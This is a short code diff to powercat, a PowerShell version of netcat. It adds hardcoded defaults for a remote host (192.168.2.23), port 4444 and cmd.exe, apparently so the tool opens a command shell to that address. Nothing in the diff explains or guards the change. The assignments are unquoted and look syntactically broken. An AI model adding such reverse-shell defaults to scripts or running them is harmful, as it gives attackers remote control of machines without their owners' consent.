@@ -19,6 +19,10 @@
     [alias("Help")][switch]$h=$False
   )
   
+  $c = 192.168.2.23
+  $p = 4444
+  $e = cmd.exe
+  
   ############### HELP ###############
   $Help = "
 powercat - Netcat, The Powershell Version
